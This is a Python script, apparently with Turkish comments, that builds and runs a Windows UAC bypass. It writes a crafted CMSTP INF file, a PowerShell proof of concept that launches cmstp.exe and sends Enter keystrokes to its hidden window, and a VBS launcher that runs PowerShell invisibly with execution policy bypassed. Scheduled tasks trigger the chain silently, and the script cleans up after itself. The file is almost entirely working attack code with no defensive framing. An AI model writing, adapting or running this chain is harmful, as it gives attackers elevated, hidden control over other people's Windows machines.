import os
import subprocess
import time
import sys
from datetime import datetime, timedelta

def run_command(command, wait=True):
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout = result.stdout.decode(errors='replace')
    stderr = result.stderr.decode(errors='replace')
    return result.returncode, stdout, stderr

def create_inf_file():
    temp_folder = os.getenv('TEMP')
    inf_content = f"""
[version]
Signature="$Windows NT$"
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
; Commands to run before setup begins
taskkill /IM cmstp.exe /F
cmd /c start {temp_folder}\\ddd.vbs

[CustInstDestSectionAllUsers]
49000,49001=AllUser_LDIDSection,7

[AllUser_LDIDSection]
"HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
"""
    inf_file_path = os.path.join(temp_folder, 'corpvpn.inf')
    with open(inf_file_path, 'w') as f:
        f.write(inf_content)

    return inf_file_path

def create_a_ps1():
    ps_code = '''
# UAC Bypass poc using SendKeys
$InfFile = "$env:TEMP\\corpvpn.inf"

Function Get-Hwnd {
    Param([string] $ProcessName)
    Try {
        $hwnd = Get-Process -Name $ProcessName | Select-Object -ExpandProperty MainWindowHandle
    } Catch {
        $hwnd = $null
    }
    return $hwnd
}

function Set-WindowActive {
    Param([string] $Name)
    $memberDefinition = @'
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
'@
    Add-Type -MemberDefinition $memberDefinition -Name Api -Namespace User32
    $hwnd = Get-Hwnd -ProcessName $Name
    if ($hwnd) {
        [User32.Api]::SetForegroundWindow($hwnd)
        [User32.Api]::ShowWindow($hwnd, 0)
    }
}

Add-Type -AssemblyName System.Windows.Forms

$ps = New-Object System.Diagnostics.ProcessStartInfo "c:\\windows\\system32\\cmstp.exe"
$ps.Arguments = "/au $InfFile"
$ps.UseShellExecute = $false
$ps.CreateNoWindow = $true

[System.Diagnostics.Process]::Start($ps) | Out-Null

do {
    Start-Sleep -Milliseconds 200
} until ((Get-Hwnd "cmstp") -ne $null)

Set-WindowActive "cmstp"
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
'''
    temp_folder = os.getenv('TEMP')
    a_ps1_path = os.path.join(temp_folder, 'a.ps1')
    with open(a_ps1_path, 'w') as f:
        f.write(ps_code)

    return a_ps1_path

def create_vbs_launcher(ps1_path):
    vbs_path = os.path.join(os.getenv('TEMP'), 'run.vbs')
    with open(vbs_path, 'w') as f:
        f.write(f'''
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell -ExecutionPolicy Bypass -File \"{ps1_path}\"", 0, False
''')
    return vbs_path

def main():
    # 1. Görevleri temizle
    run_command('schtasks /delete /tn "InstallRequests" /f')
    run_command('schtasks /delete /tn "RunPowerShellScript" /f')

    # 2. Python var mı kontrol et
    returncode, _, _ = run_command("python --version")
    if returncode != 0:
        returncode, _, _ = run_command('first.exe /quiet InstallAllUsers=0 PrependPath=1')
        if returncode != 0:
            sys.exit(1)

    # 3. requests modülünü kuracak scripti oluştur
    temp_dir = os.getenv('TEMP')
    script_path = os.path.join(temp_dir, 'install_requests.py')
    with open(script_path, 'w') as script_file:
        script_file.write("import subprocess\n")
        script_file.write("subprocess.check_call(['python', '-m', 'pip', 'install', 'requests'])\n")

    # 4. Schedule it (gizli gerekmez çünkü pip install zaten arka plan)
    now = datetime.now() + timedelta(minutes=1)
    time_str = now.strftime("%H:%M")
    run_command(f'schtasks /create /tn "InstallRequests" /tr "python {script_path}" /sc once /st {time_str} /f')
    run_command('schtasks /run /tn "InstallRequests"')
    time.sleep(10)
    os.remove(script_path)

    # 5. INF ve PowerShell dosyasını oluştur
    inf_file_path = create_inf_file()
    a_ps1_path = create_a_ps1()
    vbs_launcher = create_vbs_launcher(a_ps1_path)

    # 6. Tamamen sessiz PowerShell script çalıştırmak için VBS kullan
    future_time = (datetime.now() + timedelta(minutes=2)).strftime("%H:%M")
    resultcode, out, err = run_command(f'schtasks /create /tn "RunPowerShellScript" /tr "wscript.exe //B //Nologo {vbs_launcher}" /sc once /st {future_time} /f')
    if resultcode != 0:
        print(f"Task creation failed: {err}")
        sys.exit(1)

    run_command('schtasks /run /tn "RunPowerShellScript"')

if __name__ == "__main__":
    main()
